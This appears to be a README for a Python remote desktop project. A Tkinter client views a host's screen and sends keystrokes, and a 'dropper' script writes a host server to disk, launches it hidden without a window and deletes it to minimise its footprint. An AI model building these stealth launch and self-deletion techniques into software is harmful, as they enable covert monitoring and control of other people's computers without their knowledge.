# Remote Desktop and Input Controller via TCP (v6.1)

## Description

This Python-based project enables remote control of a computer on the **same local Wi-Fi network** through real-time screen streaming and keyboard input simulation. It consists of two main scripts:

1. **`clientUI.py`**: A Tkinter GUI client that lets users enter the host's IPv4 address, view live screen updates, and send keyboard events.
2. **`payload.py`**: A dropper script that generates and silently launches a host server (`making.py`) to stream its screen and process key events.

> **Important:** Run `clientUI.py` on the client device and `payload.py` on the host device. Avoid running both on the same machine to prevent input conflicts.

## Features

### `clientUI.py` (Graphical Client)

- **Tkinter Interface**
  - **Entry Widget** for host IP input with gray placeholder text (`"Enter IPV4 to connect:"`).
  - **Read-Only Output Entry** bound to `output_var` to display connection status and error messages.
  - **Connect Button** invokes `on_receive()`, reads `entry`, sets `HOST`, and starts `start_client()` in a daemon thread.
  - **Stop Connect Button** calls `exit()`, sending a `"DISCONNECT"` message and cleaning up keyboard hooks.

- **Network & Streaming**
  - Connects to `(HOST, 5050)` over TCP.
  - **`receive_image()` thread** reads a 4-byte header (`struct.calcsize(">L")`), reconstructs PNG-compressed frames, decodes via `cv2.imdecode`, and updates `latest_frame`.
  - Main loop displays `latest_frame` using `cv2.imshow("Host Screen", latest_frame)` and listens for `ESC` in window to disconnect.

- **Keyboard Event Capture**
  - Uses the `keyboard` library to hook `on_press(send_key)`, capturing modifiers (`ctrl`, `shift`, `alt`) and regular keys.
  - **`send_key(event)`** wraps event sending with a `@time_it` decorator that logs execution time to `OUTPUT`.
  - Serializes events as JSON: either `{"type": "hotkey", "keys": [...]}` or `{"key": name, "event_type": "down"}` with a 4-byte length header.
  - **Toggle Input**: Backtick (\`) flips `allow_input` and updates `OUTPUT`.

- **Graceful Shutdown**
  - **`exit()`** sets `connecting = False`, sends `"DISCONNECT"`, clears hotkeys, and closes the socket.
  - Both GUI button and pressing `ESC` in the OpenCV window trigger `exit()`.

### `payload.py` (Dropper Script)

- **Purpose**: Acts as a dropper that writes and launches `making.py`, the actual host server script.
- **Dropper Flow**:
  1. **Logging**: Prints the current working directory.
  2. **Write Payload**: Writes the `payload_code` string to `making.py`.
  3. **Execute Payload** via `run_payload()`:
     - **Windows**: Uses `subprocess.Popen(["python", "making.py"], creationflags=subprocess.CREATE_NO_WINDOW)`.
     - **Linux/macOS**: Uses `subprocess.Popen(["python3", "making.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=os.setpgrp)`.
     - **Other OS**: Prints "Unknown OS".
     - Prints "Dropped making.py" and "Launched making.py." on success.
  4. **Cleanup**: After a 0.5s delay, deletes `making.py` to minimize footprint.

- **Host Server Code** (embedded in `payload_code`):
  - **Networking**: Binds a TCP socket to `(SERVER, PORT)` with `SO_REUSEADDR`; `SERVER` is determined by `socket.gethostbyname(socket.gethostname())`.
  - **Threading**:
    - **`handle_client(conn, addr)`** spawns three daemon threads:
      1. **`handle_input(conn)`**: Reads 4-byte length-prefixed JSON messages, enqueues them into `letter_input`.
      2. **`stream_screen(conn)`**: Captures the screen via `mss`, resizes to 960×540, encodes to PNG, and sends with a 4-byte header at up to 240 FPS.
      3. **`process_key_event()`**: Dequeues messages every 0.05s and invokes `write_out` to simulate key events.
  - **Input Processing** (`write_out`):
    - Parses JSON; if `"type": "hotkey"`, presses then releases each key in order.
    - Otherwise, for `"event_type": "down"`, calls `keyboard.press_and_release(key)` (ignores "caps lock" and backtick).
  - **Controls**:
    - **Toggle Input**: Backtick (`\``) toggles the global `allow_input` flag and logs the new state.
    - **Graceful Shutdown**: Pressing `ESC` triggers `stop()`, which sets `server_running = False`, sends `DISCONNECT_MSG`, closes all client connections, unhooks keyboard hooks, and closes the server socket.
  - **Execution Time Logging**: All core functions (`handle_input`, `stream_screen`, `handle_client`, `process_key_event`, `stop`, `start_host`) are decorated with `@time_it` to print execution duration.

## Technologies Used

- **Python Version:** 3.12.6
- **Editor:** Visual Studio Code

### Python Libraries

- **Networking & Concurrency:** `socket`, `struct`, `threading`, `queue`, `json`
- **Screen Capture & Image Processing:** `mss`, `numpy`, `cv2` (OpenCV)
- **Input Handling:** `keyboard`
- **GUI:** `tkinter`
- **Utilities:** `time`, `subprocess`, `platform`, `functools.wraps`, `os`, `sys`

## Installation

1. **Clone the Repository**
   ```bash
   git clone https://github.com/truongbaan/py-host-client.git
   cd py-host-client
   cd serverV6_screen_responsive_and_input_fast
   cd bonus
   ```

2. **Install Python 3.12.6**
   Download and install from [python.org](https://www.python.org/downloads/).

3. **Install Dependencies**

   - **Python Packages** (via `pip`):
     ```bash
     pip install opencv-python keyboard mss numpy
     ```
   - **GUI Library (Tkinter)**:
     Tkinter is included with most Python installations. If it is missing, install via your OS's package manager:
     - **Debian/Ubuntu**:
       ```bash
       sudo apt-get install python3-tk
     - **Windows**: Typically included with the official Python installer.

   > **Note:** The `keyboard` library may require elevated (administrator/root) privileges to capture and simulate key events.

## Usage

### Host (Dropper)

```bash
python payload.py
```

- Drops and launches `making.py` as a background process.
- Begins listening on the host’s local IPv4 and port 5050.
- Streams screen and processes key input immediately.
- Press `ESC` on the host machine to shut down the server gracefully.

### Client (GUI)

```bash
python clientUI.py
```

1. Enter the **IPv4 address** of the host in the input field.
2. Click **Connect**:
   - Opens a window titled **"Host Screen"** showing the live feed.
   - Hooks keyboard to send events remotely.
3. Toggle input delivery with the backtick key (`\``).
4. Press `ESC` (or click **Stop connect**) to disconnect.

> Ensure both devices are on the **same local network**.

## Notes

- **PNG Compression:** Balances fidelity and performance for screen frames.
- **Frame Rate:** Stream capped at 240 FPS; adjust `target_fps` in `making.py` if needed.
- **Thread Safety:** Queues buffer key events to prevent race conditions.
- **Self-Destructing Payload:** `making.py` is removed after launch to minimize footprints.

## License

This project is licensed under the MIT License. See `LICENSE` for details.

